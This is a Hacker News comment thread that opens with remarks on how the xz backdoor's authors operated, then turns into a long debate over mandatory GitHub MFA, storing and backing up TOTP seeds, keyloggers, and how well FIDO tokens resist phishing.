[9 months ago](item?id=39871613)   | [root](#39867106) | [parent](#39871451) | [next](#39872247) [–]  I wonder what the point is, I don't remember GitHub warning me that I've used the se SSH key for years... | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39872247)   | [root](#39867106) | [parent](#39871451) | [prev](#39871613) | [next](#39871953) [–]  And? | | --- | --- | --- | | | |  |  | [EasyMark](user?id=EasyMark) [9 months ago](item?id=39871953)   | [root](#39867106) | [parent](#39867911) | [prev](#39870947) | [next](#39868596) [–]  they might not have been playing the long con. maybe approached by actors willing to pay them a lot of money to try and slip in a back door. I'm sure a deep dive into code contributions would clear that up for anyone familiar with the code base and some free time. | | --- | --- | --- | | | |  |  | [bobba27](user?id=bobba27) [9 months ago](item?id=39872985)   | [root](#39867106) | [parent](#39871953) | [next](#39927927) [–]  They did fuck up quite a bit though. They injected their payload before they checked if oss-fuzz or valgrind or ... would notice something wrong. That is sloppy and should have been anticipated and addressed BEFORE activating the code. Anyway. This team got caught. What are the odds that this state-actor that did this, that this was the only project / team / library that they decided to attack? | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39927927)   | [root](#39867106) | [parent](#39871953) | [prev](#39872985) | [next](#39868596) [–]  Using sockpuppets to pressure the original maintainer into granting commit access in the first place backs the long con theory. | | --- | --- | --- | | | |  |  | [the8472](user?id=the8472) [9 months ago](item?id=39868596)   | [root](#39867106) | [parent](#39867911) | [prev](#39871953) | [next](#39872781) [–]  github already mandates MFA for members of important projects | | --- | --- | --- | | | |  |  | [rvense](user?id=rvense) [9 months ago](item?id=39869336)   | [root](#39867106) | [parent](#39868596) | [next](#39870394) [–]  Doesn't it mandate it for everyone? I don't use it anymore and haven't logged in since forever, but I think I got a series of e-mails that it was being made mandatory. | | --- | --- | --- | | | |  |  | [ryukoposting](user?id=ryukoposting) [9 months ago](item?id=39869739)   | [root](#39867106) | [parent](#39869336) | [next](#39869963) [–]  It will soon. I think I have to sort it out before April 4. My passwords are already >20 random characters, so I wasn't going to do it until they told me to. | | --- | --- | --- | | | |  |  | [pabs3](user?id=pabs3) [9 months ago](item?id=39873360)   | [root](#39867106) | [parent](#39869739) | [next](#39869963) [–]  If you are using pass to store those, check out pass-otp and browserpass, since GitHub still allows TOTP for MFA. pass-otp is based on oathtool, so you can do it more manually too if you don't use pass. | | --- | --- | --- | | | |  |  | [ryukoposting](user?id=ryukoposting) [9 months ago](item?id=39905372)   | [root](#39867106) | [parent](#39873360) | [next](#39869963) [–]  My solution is far shittier than any of those. | | --- | --- | --- | | | |  |  | [loeg](user?id=loeg) [9 months ago](item?id=39869963)   | [root](#39867106) | [parent](#39869336) | [prev](#39869739) | [next](#39870394) [–]  It mandates it for everyone. I'm locked out of Github because fuck that. | | --- | --- | --- | | | |  |  | [illusive4080](user?id=illusive4080) [9 months ago](item?id=39870353)   | [root](#39867106) | [parent](#39869963) | [next](#39870394) [–]  Why opposed to MFA? Source code is one of the most important assets in our realm. | | --- | --- | --- | | | |  |  | [hobobaggins](user?id=hobobaggins) [9 months ago](item?id=39870609)   | [root](#39867106) | [parent](#39870353) | [next](#39870747) [–]  Most people will have to sync their passwords (generally strong and unique, given that it's for github) to the same device where their MFA token is stored, rendering it (almost) completely moot, but at a significantly higher risk of permanent access loss (depending on what they do with the reset codes, which, if compromised, would *also* make MFA moot.) (a cookie theft makes it all moot as well.) The worse part is that people *think* they're more protected, when they're really not. | | --- | --- | --- | | | |  |  | [Dylan16807](user?id=Dylan16807) [9 months ago](item?id=39870738)   | [root](#39867106) | [parent](#39870609) | [next](#39927967) [–]  Bringing everyone up to the level of "strong and unique password" sounds like a huge benefit. Even if your "generally" is true, which I doubt, that leaves a lot of gaps. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39927967)   | [root](#39867106) | [parent](#39870609) | [prev](#39870738) | [next](#39870747) [–]  Doesn't help that a lot of companies still just allow anyone with access to the phone number to gain access to the account (via customer support or automated SMS-based account recovery). | | --- | --- | --- | | | |  |  | [loeg](user?id=loeg) [9 months ago](item?id=39870747)   | [root](#39867106) | [parent](#39870353) | [prev](#39870609) | [next](#39870556) [–]  It's inconvenient, SMS 2FA is arguably security theater, and redundant with a real password manager. Hopefully Passkeys kills 2FA for most services. | | --- | --- | --- | | | |  |  | [illusive4080](user?id=illusive4080) [9 months ago](item?id=39886642)   | [root](#39867106) | [parent](#39870747) | [next](#39870841) [–]  SMS 2FA is the devil. It’s the reason I haven’t swapped phone numbers even though I get 10-15 spam texts a day. The spam blocking apps don’t help and intrude on my privacy. | | --- | --- | --- | | | |  |  | [Hawxy](user?id=Hawxy) [9 months ago](item?id=39870841)   | [root](#39867106) | [parent](#39870747) | [prev](#39886642) | [next](#39870556) [–]  FYI github already supports using passkeys as a combined login/2FA source. I haven't used my 2FA codes for a while now. | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [9 months ago](item?id=39870556)   | [root](#39867106) | [parent](#39870353) | [prev](#39870747) | [next](#39870969) [–]  Freedom is far more important. | | --- | --- | --- | | | |  |  | [illusive4080](user?id=illusive4080) [9 months ago](item?id=39870571)   | [root](#39867106) | [parent](#39870556) | [next](#39870638) [–]  But you can use any totp authenticator. The protocol is free and open. | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [9 months ago](item?id=39870627)   | [root](#39867106) | [parent](#39870571) | [next](#39870638) [–]  It's more to make the point that "no means no." An act of protest. (I have written a TOTP implementation myself. I do not have a GH account, and likely never will.) | | --- | --- | --- | | | |  |  | [Dylan16807](user?id=Dylan16807) [9 months ago](item?id=39870712)   | [root](#39867106) | [parent](#39870627) | [next](#39870638) [–]  It's ridiculous to say "no means no" about not wanting to use a password to get an account, right? What makes TOTP different from a password in terms of use or refusal? | | --- | --- | --- | | | |  |  | [ndriscoll](user?id=ndriscoll) [9 months ago](item?id=39871390)   | [root](#39867106) | [parent](#39870712) | [next](#39870638) [–]  Browsers don't save the TOTP seed and auto fill it for you for one, making it much less user friendly than a password in practice. The main problem I have with MFA is that it gets used too frequently for things that don't need that much protection, which from my perspective is basically anything other than making a transfer or trade in my bank/brokerage. Just user-hostile requiring of manual action, including finding my phone that I don't always keep on me. It's also often used as a way to justify collecting a phone number, which I wouldn't even *have* if not for MFA. | | --- | --- | --- | | | |  |  | [jeromegv](user?id=jeromegv) [9 months ago](item?id=39874561)   | [root](#39867106) | [parent](#39871390) | [next](#39874324) [–]  We are talking of non-SMS MFA | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39874324)   | [root](#39867106) | [parent](#39871390) | [prev](#39874561) | [next](#39870638) [–]  Mine does. Yours doesn't? | | --- | --- | --- | | | |  |  | [creatonez](user?id=creatonez) [9 months ago](item?id=39870638)   | [root](#39867106) | [parent](#39870556) | [prev](#39870571) | [next](#39872368) [–]  Should you have the freedom to put in a blank password, too? | | --- | --- | --- | | | |  |  | [voidz](user?id=voidz) [9 months ago](item?id=39872734)   | [root](#39867106) | [parent](#39870638) | [next](#39872368) [–]  My password is a single 'a'. Nobody will ever guess that one. | | --- | --- | --- | | | |  |  | [Freedom2](user?id=Freedom2) [9 months ago](item?id=39872368)   | [root](#39867106) | [parent](#39870556) | [prev](#39870638) | [next](#39870969) [–]  They have the freedom to request whatever authentication method they want. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39870969)   | [root](#39867106) | [parent](#39870353) | [prev](#39870556) | [next](#39871220) [–]  My source code is important to others but not to me. I have backups. but 2FA is annoying to me. It's very easy to permanently lose accounts when 2FA is in use. If I lose my device my account is gone for good. Tokens from github never expire, and can do everything via API without ever touching 2FA, so it's not that secure. | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39871075)   | [root](#39867106) | [parent](#39870969) | [next](#39871220) [–]  "If I lose my device my account is gone for good." Incorrect, unless you choose not to record your seeds anywhere else, which is not a 2fa problem. 2fa is in the end nothing more than a 2nd password that just isn't sent over the wire when used. You can store a totp seed exactly the same as a password, in any form you want, anywhere you want, and use on a brand new device at any time. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39872243)   | [root](#39867106) | [parent](#39871075) | [next](#39871220) [–]  > Incorrect, unless you choose not to record your seeds anywhere else, which is not a 2fa problem. You know google authenticator app introduced a backup feature less than 1 year ago right? You know phones break all the time right? | | --- | --- | --- | | | |  |  | [jeromegv](user?id=jeromegv) [9 months ago](item?id=39874572)   | [root](#39867106) | [parent](#39872243) | [next](#39872418) [–]  There has been other apps doing the same as Google Authenticator for 10 years and they didn’t require you not to lose your phone. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39879417)   | [root](#39867106) | [parent](#39874572) | [next](#39872418) [–]  And why would I invest the time to figure this all out when the only one being advantaged are others? | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39872418)   | [root](#39867106) | [parent](#39872243) | [prev](#39874572) | [next](#39871220) [–]  You know google authenticator doesn't matter right? You know you could always copy your totp seeds since day one regardless of which auth app or it's features or limits right? You know that a broken device does not matter at all, because you have other copies of your seeds just like the passwords, right? When I said they are just another password, I was neither lying nor in error. I presume you can think of all the infinite ways that you would keep copies of a password so that when your phone or laptop with keepassxc on it breaks, you still have other copies you can use. Well when I say just like a password, that's what I mean. It's just another secret you can keep anywhere, copy 50 times in different password managers or encrypted files, print on paper and stick in a safe, whatever. Even if some particular auth app does not provide any sort of manual export function (I think google auth did have an export function even before the recent cloud backup, but let's assume it didn't), you can still just save the original number the first time you get it from a qr code or a link. You just had to know that that's what those qr codes are doing. They aren't single-use, they are nothing more than a random secret which you can keep andbcopy and re-use forever, exactly the same as a password. You can copy that number into any password manager or plain file or whatever you want just like a password, and then use it to set up the same totp on 20 different apps on 20 different devices, all working at the same time, all generating valid totp codes at the same time, destroy them all, buy a new phone, retrieve any one of your backup keepass files or printouts, and enter them into a fresh app on a fresh phone and get all your totp fully working again. You are no more locked out than by having to reinstall a password manager app and access some copy of your password db to regain the ordinary passwords. The only difference from a password is, the secret is not sent over the wire when you use it, something derived from it is. Google authenticators particular built in cloud copy, or lack of, doesn't matter at all, and frankly I would not actually use that particular feature or that particular app. There are lots of totp apps on all platforms and they all work the same way, you enter the secret give it a name like your bank or whatever, select which algorithm (it's always the default, you never have to select anything) and instantly the app starts generating valid totp codes for that account the same as your lost device. Aside from saving the actual seed, let's say you don't have the original qr code any more (you didn't print it or screenshot it or right-click save image?) there is yet another emergency recovery which is the 10 or 12 recovery passwords that every site gives you when you first set up totp. You were told to keep those. They are special single-use passwords that get you in without totp, but each one can only be used once. So, you are a complete space case and somehow don't have any other copiesbof your seeds in any form, including not even simple printouts or screenshots of the original qr code, STILL no problem. You just burn one of your 12 single-use emergency codes, log in, disable and re-enable totp on that site, get a new qr code and a new set of emergency codes. Your old totp seed and old emergency codes no longer work so thow those out. This time, not only keep the emergency codes, also keep the qr code, or more practical, just keep the seed value in the qr code. It's right there in the url in the qr code. Sometimes they even display the seed value itself in plain text so that you can cut & paste it somewhere, like into a field in keepass etc. In fact keepass apps on all platforms also will not only store the seed value but display the current totp for it just like a totp app does. But a totp app is a more convenient. And for proper security, you technically shouldn't store both the password and the totp seed for an account in the same place, so that if someone gains access to one, they don't gain access to both. That's inconvenient but has to be said just for full correctness. I think most sites do a completely terrible job of conveying just what totp is when you're setting it up. They tell you to scan a qr code but they kind of hide what that actually is. They DO all explain about the emergency codes but really those emergency codes are kind of stupid. If you can preserve a copy of the emergency codes, then you can just as easily preserve a copy of the seed value itself exactly the same way, and then, what's the point of a hanful of single-use emergency passwords when you can just have your normal fully functional totp seed? Maybe one use for the emergency passwords is you could give them to different loved ones instead of your actual seed value? Anyway if they just explained how totp basically works, and told you to keep your seed value instead of some weird emergency passwords, you wouldn't be screwed when a device breaks, and you would know it and not be worried about it. Now, if, because of that crappy way sites obscure the process, you currently don't have your seeds in any re-usable form, and also don't have your emergency codes, well then you will be F'd when your phone breaks. But that is fixable. Right now while it works you can log in to each totp-enabled account, and disable & reenable totp to generate new seeds, and take copies of them this time. Set them up on some other device just to see that they work. Then you will no longer have to worry about that. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39879428)   | [root](#39867106) | [parent](#39872418) | [next](#39871220) [–]  > since day one But if you forgot to do it on day one, you can't do it on day two because there is no way of getting them out other than rooting the phone. Giving how your premise was wrong, I won't bother to read that novel you wrote. I'll just assume it's all derived from the wrong premise. | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39886740)   | [root](#39867106) | [parent](#39879428) | [next](#39879996) [–]  My original, correct, message was perfectly short. You don't like long full detailed explainations, and you ignore short explainations. Pick a lane! A friend of mine a long time ago used to have a humorous classification system, that people fell into 3 groups: The clued, The clue-able, The clue-proof. Some people already understand a thing. Some people do not understand a thing, but CAN understand it. Some people exist in a force bubble of their own intention that actively repels understanding. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39887311)   | [root](#39867106) | [parent](#39886740) | [next](#39879996) [–]  I see that in your classification system an important entry is missing. The ones who disagree. In your quest to convince me you forgot to even stop to ponder if you're right at all. And in my view, you aren't. Perhaps the problem isn't that I don't understand you. Perhaps I understand you perfectly well but I understand even more, to realise that you're wrong :) | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39887477)   | [root](#39867106) | [parent](#39887311) | [next](#39879996) [–]  You have not shown me being wrong. No one is stopping you. This is a silly thing to argue about but hey I'm silly so let's unpack your critique of the classification system There is no 4th classification. It only speaks of understanding not agreeing. Things that are matters of opinion may still be understood or not understood. Whether a thing is a matter of opinion or a matter of fact, both sides of a disagreement still slot into one of those classes. If a thing is a matter of opinion, then one of the possible states is simply that both sides of a disagreement understand the thing. In this case, it is not a matter of opinion, and if you want to claim that I am the one who does not understand, that is certainly possible, so by all mrans, show how. What fact did I say that was not true? Keep trying soldier. You never know. (I mean \_I\_ know, but you don't. As far as you know, until you go find out, I might be wrong.) Whatever you do, don't actually go find out how how it works. Instead, continue avoiding finding out how it works, because holy cow after you've gone this far... it's one thing to just be wrong about something, everyone always has to start out not understanding something, that's no failing, but to have no idea what you're talking about yet try to argue about it, in error the whole time..., I mean they (me) were such an insufferable ass already trying to lecture YOU, but for them (me) to turn out to have been simply correct in every single fact they spoke, without even some technicality or anything to save a little face on? Absolutely unthinkable. Definitely better to save yourself from that by just never investigating. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39891875)   | [root](#39867106) | [parent](#39887477) | [next](#39879996) [–]  > No one is stopping you. You are too busy writing novels and raging at me to read what I wrote with an open mind. | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39879996)   | [root](#39867106) | [parent](#39879428) | [prev](#39886740) | [next](#39871220) [–]  My original statement was only that this is not a 2fa problem, which was and still is true. The fact that you did not know this does not change this fact. I acknowledged that web sites don't explain this well, even actively hide it. So it's understandable not to know this. But I also reminded that this doesn't actually matter because you WERE also given emergency recovery passwords, and told to keep them, and told why, and how important they were. You were never at risk of being locked out from a broken device EVEN THOUGH you didn't know about saving the seed values, UNLESS you also discarded the emergency codes, which is not a 2fa problem, it's an "I didn't follow directions" problem. And even if all of that happened, you can still, right now, go retroactively fix it all, and get all new seed values and save them this time, as long long as your one special device happens to be working right now. It doesn't matter what features google authenticator has today, or had a year ago. It's completely and utterly irrelevant. My premis remains correct and applicable. Your statement that 2fa places you at at risk was incorrect. You may possibly be at risk, but if so you did that to yourself, 2fa did not do that to you. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39902513)   | [root](#39867106) | [parent](#39879996) | [next](#39871220) [–]  > But I also reminded that this doesn't actually matter because you WERE also given emergency recovery passwords, and told to keep them, and told why, and how important they were. Ah yes those… the codes I must go to a public library to print, on a public computer, public network and public printer. I can't really see any problem with the security of this. And then I must never forget where I put that very important piece of paper. Not in 10 years and after moving 3 times… | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39903919)  [flagged]  | [root](#39867106) | [parent](#39902513) | [next](#39871220) [3 more]  You can save a few bits of text any way you want. You can write them in pencil if you want just as a backup against google killing your google drive or something. Or just keep them in a few copies of a password manager db in a few different places. It's trivial. What in the world is this library drama? No one is this obtuse, so your arguments are most likely disingenuous. But if they are sincere, then find a nephew or someone to teach you how your computer works. Libraries? Remembering something for 10 years? Moving? Oh the humanity! | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39928005)   | [root](#39867106) | [parent](#39903919) | [next](#39871220) [–]  > You can save a few bits of text any way you want. So I can keep them on the same device that I keep my passwords, right? > Or just keep them in a few copies of a password manager db in a few different places. Great now you no longer have 2FA but just a longer password. | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39936451)   | [root](#39867106) | [parent](#39928005) | [next](#39871220) [–]  Yes, you can keep them on the same device if you choose to. Or not. You decide how much effort you want and where you want to place the convenience vs security slider. Yes, if you keep both factors not only on the same device but in the same password manager, then both factors essentially combine into nothing but a longer password. I did say from the very first, that the seeds are nothing other than another password. Except there is still at least one difference which I will say for at least the 3rd time... the totp secret is not transmitted over the wire when it is used, the password is. That is actually a significant improvement all by itself even if you do everything else the easy less secure way. And you do not *have* to store the seeds the convenient less secure way. You can have them in a different password app with a different master password on the same device, or on seperate devices, or in seperate physical forms. You can store them any way you want, securely, or less securely. The point is that even while opting to do things all the very secure way, you are still not locked out of anything when a single special device breaks, because you are not limited to only keeping a single copy of the seeds or the emergency passwords in a single place like on a single device or a single piece of paper. You are free to address any "but what about" questions you decide you care about in any way you feel like. The only way you were ever screwed is by the fact that the first time you set up 2fa for any site, most sites don't explain the actual mechanics but just walk you through a sequence of actions to perform without telling you what they actually did, and so at the end of following those directions you ARE left with the seeds only stored in a single place. And in the particular case of Google Authenticator, stored in a more or less inaccessible place in some android sqlite file you can't even manually get to without rooting your phone probably. And were never even told about the seed value at all. You were given those emergency passwords instead. That does leave you with a single precious drvice that must not break or be lost. But the problem is only a combination of those bad directions given by websites, and the limitations of one particular totp app when that app didn't happen to display or export or cloud-backup the seeds until recently. Even now Googles answer is a crap answer, because Google can see the codes unencrypted on their server, and Google can kill your entire gooogle account at sny time and you lose everything, email, drive , everything, instantly, no human to argue with. That is why I said even today I still would not use Google Authenticator for totp. Except even in that one worst case, you still had the emergency passwords, which you were always free to keep in whatever way works for you. There is no single thing you must or must not do, there is only what kinds of problems are the worst problems for you. Example: if what you are most concerned about is someone else getting ahold of a copy of those emergency passwords, then you want to have very few copies of them and they should be off-line and inconvenient to access. IE a printed hard copy in a safe deposit box in switzerland. If what you are most concerned about is accidentally destroying your life savings by losing the password and the investment site has no further way to let you prove your ownership, then keep 10 copies in 10 different physical forms and places so that no matter what happens, you will always be able to access at least one of them. One on goggle drive, one on someone else's google drive in case yours is killed, one on onedrive, one on paper at home, one on paper in your wallet, one on your previous phonr that you don't use but still works, etc etc. You pick whichever is your biggest priority, and address that need however you want, from pure convenience to pure security and all possible points in between. The convenient way has security downsides. The secure way has convenience downsides. But you are not forced to live with the downsides of either the convenient way or the secure way. | | --- | --- | --- | | | |  |  | [jjav](user?id=jjav) [9 months ago](item?id=39871220)   | [root](#39867106) | [parent](#39870353) | [prev](#39870969) | [next](#39870394) [–]  > Why opposed to MFA? Source code is one of the most important assets in our realm. Because if you don't use weak passwords MFA doesn't add value. I do recommend MFA for most people because for most people their password is the name of their dog (which I can look up on social media) followed by "1!" to satisfy the silly number and special character rules. So yes please use MFA. But if your (like my) passwords are 128+bits out of /dev/random, MFA isn't adding value. | | --- | --- | --- | | | |  |  | [admax88qqq](user?id=admax88qqq) [9 months ago](item?id=39871322)   | [root](#39867106) | [parent](#39871220) | [next](#39871280) [–]  Sure it is. If your system ever gets keylogged and somebody gets your password you are compromised With MFA even if somebody has your password if they don't have your physical authenticator too then you're relatively safe. | | --- | --- | --- | | | |  |  | [ndriscoll](user?id=ndriscoll) [9 months ago](item?id=39871793)   | [root](#39867106) | [parent](#39871322) | [next](#39871821) [–]  If you have a keylogger, they can also just take your session cookie/auth tokens or run arbitrary commands while you're logged in. MFA does nothing if you're logging into a service on a compromised device. | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [9 months ago](item?id=39872321)   | [root](#39867106) | [parent](#39871793) | [next](#39871857) [–]  Keyloggers can be physically attached to your keyboard. There could also be a vulnerability in the encryption of wireles keyboards. Certificate-based MFA is also phishing resistant, unlike long, random, unique passwords. There are plenty of scenarios where MFA is more secure than just a strong password. | | --- | --- | --- | | | |  |  | [ndriscoll](user?id=ndriscoll) [9 months ago](item?id=39875187)   | [root](#39867106) | [parent](#39872321) | [next](#39873030) [–]  These scenarios are getting into some Mission Impossible level threats. Most people use their phones most of the time now, meaning the MFA device is the same device they're using. Of the people who aren't using a phone, how many are using a laptop with a built in keyboard? It's pretty obvious if you have a USB dongle hanging off your laptop. If you're using a desktop, it's going to be in a relatively secure environment. Bluetooth probably doesn't even reach outside. No one's breaking into my house to plant a keylogger. And a wireless keyboard seems kind of niche for a desktop. It's not going to move, so you're just introducing latency, dropouts, and batteries into a place where they're not needed. Long, random, unique passwords are phishing resistant. I don't know my passwords to most sites. My web browser generates and stores them, and only uses them if it's on the right site. This has been built in functionality for years, and ironically it's sites like *banks* that are most likely to disable auto fill and require weak, manual passwords. | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [9 months ago](item?id=39875827)   | [root](#39867106) | [parent](#39875187) | [next](#39873030) [–]  I mean, both can be true at the same time. I have to admit that I only use MFA when I'm forced to, because I also believe my strong passwords are good enough. Yet I can still acknowledge that MFA improves security further and in particular I can see why certain services make it a requirement, because they don't control how their users choose and use their passwords and any user compromise is associated with a real cost, either for them like in the case of credit card companies or banks, or a cost for society, like PyPI, Github, etc. | | --- | --- | --- | | | |  |  | [RaisingSpear](user?id=RaisingSpear) [9 months ago](item?id=39873030)   | [root](#39867106) | [parent](#39872321) | [prev](#39875187) | [next](#39875403) [–]  But password managers typically don't send keyboard commands to fill in a password, so a physical device would be useless. > There are plenty of scenarios where MFA is more secure than just a strong password. And how realistic are they? Or are they just highly specific scenarios where all the stars must align, and are almost never going to happen? | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [9 months ago](item?id=39873341)   | [root](#39867106) | [parent](#39873030) | [next](#39875403) [–]  I don't think phishing is such an obscure scenario. The point is also that you as an individual can make choices and assess risk. As a large service provider, you will always have people who reuse passwords, store them unencrypted, fall for phishing, etc. There is a percentage of users that will get their account compromised because of bad password handling which will cost you, and by enforcing MFA you can decrease that percentage, and if you mandate yubikeys or something similar the percentage will go to zero. | | --- | --- | --- | | | |  |  | [RaisingSpear](user?id=RaisingSpear) [9 months ago](item?id=39873841)   | [root](#39867106) | [parent](#39873341) | [next](#39875403) [–]  > I don't think phishing is such an obscure scenario. For a typical person, maybe, but for a tech-minded individual who understands security, data entropy and what /dev/random is? And I don't see how MFA stops phishing - it can get you to enter a token like it can get you to enter a password. I'm also looking at this from the perspective of an individual, not a service provider, so the activities of the greater percentage of users is of little interest to me. | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [9 months ago](item?id=39873910)   | [root](#39867106) | [parent](#39873841) | [next](#39875403) [–]  > And I don't see how MFA stops phishing - it can get you to enter a token like it can get you to enter a password. That's why I qualified it with "certificate-based". The private key never leaves the device, ideally a yubikey-type device. | | --- | --- | --- | | | |  |  | [RaisingSpear](user?id=RaisingSpear) [9 months ago](item?id=39873986)   | [root](#39867106) | [parent](#39873910) | [next](#39875403) [–]  > That's why I qualified it with "certificate-based". The private key never leaves the device Except that phishing doesn't require the private key - it just needs to echo back the generated token. And even if that isn't possible, what stops it obtaining the session token that's sent back? | | --- | --- | --- | | | |  |  | [smw](user?id=smw) [9 months ago](item?id=39875121)   | [root](#39867106) | [parent](#39873986) | [next](#39874206) [–]  Doesn't work for FIDO-based tokens, they auth the site as well, so won't send anything to phishing site. | | --- | --- | --- | | | |  |  | [RaisingSpear](user?id=RaisingSpear) [9 months ago](item?id=39882969)   | [root](#39867106) | [parent](#39875121) | [next](#39874206) [–]  From my understanding, FIDO isn't MFA though (the authenticator may present its own local challenge, but I don't think the remote party can mandate it). There's also the issue of how many sites actually use it, as well as how it handles the loss of or inability to access private keys etc. I generally see stuff like 'recovery keys' being a solution, but now you're just back to a password, just with extra steps. | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [9 months ago](item?id=39874206)   | [root](#39867106) | [parent](#39873986) | [prev](#39875121) | [next](#39875403) [–]  The phisher will not receive a valid token, though, because you sign something that contains the domain you are authenticating to. | | --- | --- | --- | | | |  |  | [RaisingSpear](user?id=RaisingSpear) [9 months ago](item?id=39874395)   | [root](#39867106) | [parent](#39874206) | [next](#39875403) [–]  The phisher can just pass on whatever you sign, and capture the token the server sends back. Sure, you can probably come up with some non-HTTPS scheme that can address this, but I don't see any site actually doing this, so you're back to the unrealistic scenario. | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [9 months ago](item?id=39875373)   | [root](#39867106) | [parent](#39874395) | [next](#39875403) [–]  No, because the phisher will get a token that is designated for, say, mircos0ft.com which microsoft.com will not accept. It is signed with the user's private key and the attacker cannot forge a signature without it. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39928080)   | [root](#39867106) | [parent](#39875373) | [next](#39882981) [–]  A password manager is also not going to fill in the password on mircos0ft.com so is perfectly safe in this scenario. You need a MitM-style attack or a full on client compromise in both cases, which are vulnerable to session cookie exfiltration or just remote control of your session no matter the authentication method. | | --- | --- | --- | | | |  |  | [RaisingSpear](user?id=RaisingSpear) [9 months ago](item?id=39882981)   | [root](#39867106) | [parent](#39875373) | [prev](#39928080) | [next](#39875403) [–]  I think we're talking past each other a bit here. If I were trying to phish someone, I wouldn't attack the public key crypto part, so how domains come into play during authentication doesn't matter. I'd just grab the "unencrypted" session token at the end of the exchange. Even if you somehow protected the session token (sounds dubious), there's still plenty a phisher could do, since it has full MITM capability. | | --- | --- | --- | | | |  |  | [martinflack](user?id=martinflack) [9 months ago](item?id=39875403)   | [root](#39867106) | [parent](#39872321) | [prev](#39873030) | [next](#39871857) [–]  These days I wonder about all the cameras in a modern environment and "keylogging" from another device filming the user typing. | | --- | --- | --- | | | |  |  | [heyoni](user?id=heyoni) [9 months ago](item?id=39871857)   | [root](#39867106) | [parent](#39871793) | [prev](#39872321) | [next](#39871821) [–]  Session keys expire and can be scoped to do anything except reset password, export data, etc…that’s why you’ll sometimes be asked to login again on some websites. | | --- | --- | --- | | | |  |  | [ndriscoll](user?id=ndriscoll) [9 months ago](item?id=39871919)   | [root](#39867106) | [parent](#39871857) | [next](#39871821) [–]  If you're on a service on a compromised device, you have effectively logged into a phishing site. They can pop-up that same re-login page on you to authorize whatever action they're doing behind the scenes whenever they need to. They can pretend to be acting wonky with a "your session expired log in again" page, etc. This is part of why MFA just to log in is a bad idea. It's much more sensible if you use it *only* for sensitive actions (e.g. changing password, authorizing a large transaction, etc.) that the user almost never does. But you need *everyone* to treat it that way, or users will think it's just normal to be asked to approve all the time. | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39872266)   | [root](#39867106) | [parent](#39871919) | [next](#39871821) [–]  Some USB keys have a LCD screen on it to prevent that. You can comprise the computer that the key was inserted to, but you cannot comprise the key. If you see the things messages shows up on your computer screen differs from the messages on the key, you reject the auth request. | | --- | --- | --- | | | |  |  | [throwaway2990](user?id=throwaway2990) [9 months ago](item?id=39871821)   | [root](#39867106) | [parent](#39871322) | [prev](#39871793) | [next](#39871280) [–]  Haha yes they do. Everyone stores their 2fa in 1Password so once that’s stolen by a key longer they’re fucked. | | --- | --- | --- | | | |  |  | [samatman](user?id=samatman) [9 months ago](item?id=39871280)   | [root](#39867106) | [parent](#39871220) | [prev](#39871322) | [next](#39874247) [–]  The slogan is "something you know and something you have", right? I don't have strong opinions about making it mandatory, but I turned on 2FA for all accounts of importance years ago. I use a password manager, which means everything I "know" could conceivably get popped with one exploit. It's not that much friction to pull out (or find) my phone and authenticate. It only gets annoying when I switch phones, but I have a habit of only doing that every four years or so. You sound like you know what you're doing, that's fine, but I don't think it's true that MFA doesn't add security on average. | | --- | --- | --- | | | |  |  | [jjav](user?id=jjav) [9 months ago](item?id=39871408)   | [root](#39867106) | [parent](#39871280) | [next](#39874247) [–]  > It only gets annoying when I switch phones Right. I don't ever want to tie login to a phone because phones are pretty disposable. > I don't think it's true that MFA doesn't add security on average You're right! On average it's better, because most people have bad password and/or reuse them in more than one place. So yes MFA is better. But if your password is already impossible to guess (as 128+ random bits are) then tacking on a few more bytes of entropy (the TOTP seed) doesn't do much. | | --- | --- | --- | | | |  |  | [satokema](user?id=satokema) [9 months ago](item?id=39871603)   | [root](#39867106) | [parent](#39871408) | [next](#39874247) [–]  Those few bits are the difference between a keylogged password holder waltzing in and an automated monitor noticing that someone is failing the token check and locking the account before any damage occurs. | | --- | --- | --- | | | |  |  | [StillBored](user?id=StillBored) [9 months ago](item?id=39872180)   | [root](#39867106) | [parent](#39871603) | [next](#39874247) [–]  I think your missing parents point, both are just preshared keys, one has some additional fuzz around it so that the user in theory isn't themselves typing the same second key in all the time, but much of that security is in keeping the second secret in a little keychain device that cannot itself leak the secret. Once 